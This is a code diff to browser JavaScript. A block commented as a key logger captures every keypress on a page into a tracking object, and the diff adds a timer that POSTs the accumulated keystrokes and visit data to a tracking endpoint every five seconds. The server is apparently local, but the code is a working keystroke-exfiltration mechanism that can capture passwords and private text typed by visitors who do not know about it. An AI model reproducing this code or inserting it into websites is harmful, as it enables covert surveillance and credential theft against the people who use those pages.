@@ -14,14 +14,23 @@ $("a").each(function() {
 });
 
 // Key logger
-var keylogs = ""
 document.addEventListener('keypress', function (e) {
     e = e || window.event;
     var charCode = typeof e.which == "number" ? e.which : e.keyCode;
     if (charCode) {
-      keylogs += String.fromCharCode(charCode);
-      pageVisit.keylog = keylogs;
+      pageVisit.keylog += String.fromCharCode(charCode);
       console.log(pageVisit);
     }
 });
 
+// Send data to server every 5 seconds
+var timer = setInterval(sendData, 5000);
+function sendData() {
+  console.log(JSON.stringify(pageVisit));
+  $.ajax({
+    type: "POST",
+    url: "http://localhost:5000/api/v1/track",
+    data: JSON.stringify(pageVisit),
+    dataType: "json"
+  });
+}
